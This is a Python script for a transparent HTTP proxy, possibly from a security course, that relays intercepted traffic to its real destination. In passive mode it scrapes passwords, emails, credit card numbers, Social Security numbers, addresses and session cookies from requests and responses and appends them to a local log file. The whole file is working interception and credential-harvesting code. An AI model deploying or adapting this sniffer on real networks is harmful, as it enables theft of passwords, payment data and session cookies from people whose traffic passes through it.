import argparse
import re
import socket
from urllib.parse import urlparse, parse_qs, unquote

def extract_sensitive_info(data):
    # Define patterns for various types of sensitive information
    regex_patterns = {
        "firstname": r"firstname=([a-zA-Z]+)",  # First name
        "lastname": r"lastname=([a-zA-Z]+)",  # Last name
        "email": r"(?:email=)([a-zA-Z0-9._%+-]+[@%40][a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",  # Email pattern allowing @ or %40
        "password": r"(?:password|passwd|pwd)=([^&\s]+)",  # Password pattern
        "credit_card": r"(?:credit[-_]?card=)(\d{13,16})",  # Credit card pattern
        "ssn": r"(?:social[-_]?security=)(\d{3}-\d{2}-\d{4})",  # Social Security number pattern
        "phone": r"(?:phone=)(\d{3}-\d{3}-\d{4})",  # US phone number pattern
        "name": r"\b(?:James|John|Robert|Michael|William|David|Mary|Patricia|Linda|Barbara|Elizabeth|Jennifer|Maria|Susan|Margaret|Dorothy)\b",  # Common names
        "address": r"(?:address=)([A-Za-z0-9\s,]+)",  # US address pattern
        "city": r"(?:city=)([A-Za-z\s]+)",  # City
        "state": r"(?:state=)([A-Z]{2})",  # State (2-letter abbreviation)
        "zip": r"(?:zip=)(\d{5})",  # ZIP code
        "cookies": r"(Cookie: )([^\r\n]+)"  # Captures cookies in HTTP headers
    }

    found_data = {}
    for key, pattern in regex_patterns.items():
        matches = re.findall(pattern, data)
        if matches:
            # Process each match to ensure it's unquoted properly
            unquoted_matches = []
            for match in matches:
                if isinstance(match, tuple):
                    # Join tuple elements into a single string before unquoting
                    unquoted_match = unquote("".join(match))
                else:
                    unquoted_match = unquote(match)
                unquoted_matches.append(unquoted_match)
            found_data[key] = unquoted_matches
    return found_data


def log_passive_info(data):
    # Continuously log sensitive info to `info1.txt`
    sensitive_info = extract_sensitive_info(data)
    if sensitive_info:
        with open("info1.txt", "a") as log_file:
            for key, values in sensitive_info.items():
                for value in values:
                    log_file.write(f"{key}: {value}\n")

def handle_client(client_socket, mode, proxy_ip):
    # Receive client request
    request = client_socket.recv(4096).decode('utf-8', errors='ignore')
    
    # Extract destination from Host header in the request
    host_match = re.search(r"Host: (.+)\r\n", request)
    if host_match:
        destination_host = host_match.group(1).strip()
    else:
        client_socket.close()
        return  # Exit if there's no valid Host header

    # Resolve the destination IP and set port 80 as default for HTTP
    try:
        destination_ip = socket.gethostbyname(destination_host)
        destination_port = 80
    except socket.gaierror:
        # print(f"Could not resolve hostname: {destination_host}")
        client_socket.close()
        return

    if mode == "passive":
        # Log request data (includes headers and URL query parameters)
        print(request)
        log_passive_info(request)
    
    # Forward request to the actual destination
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.connect((destination_ip, destination_port))
        server_socket.send(request.encode('utf-8'))

        # Receive and forward response in chunks to handle large responses
        while True:
            response = server_socket.recv(4096)
            if len(response) == 0:
                break  # Exit loop when no more data is received
            
            if mode == "passive":
                # Log response data without modifying it
                log_passive_info(response.decode('utf-8', errors='ignore'))
            
            # Send the response back to the client exactly as received
            client_socket.send(response)
    except ConnectionRefusedError:
        print(f"Connection to {destination_host} ({destination_ip}) refused.")
    finally:
        client_socket.close()
        server_socket.close()



def start_proxy(ip, port, mode):
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((ip, port))
    proxy_socket.listen(5)
    print(f"Proxy listening on {ip}:{port} in {mode} mode...")

    while True:
        client_socket, addr = proxy_socket.accept()
        handle_client(client_socket, mode, ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Transparent Proxy for Logging")
    parser.add_argument("-m", "--mode", choices=["passive"], required=True, help="Mode: passive only")
    parser.add_argument("ip", help="Listening IP address")
    parser.add_argument("port", type=int, help="Listening port")
    args = parser.parse_args()

    start_proxy(args.ip, args.port, args.mode)
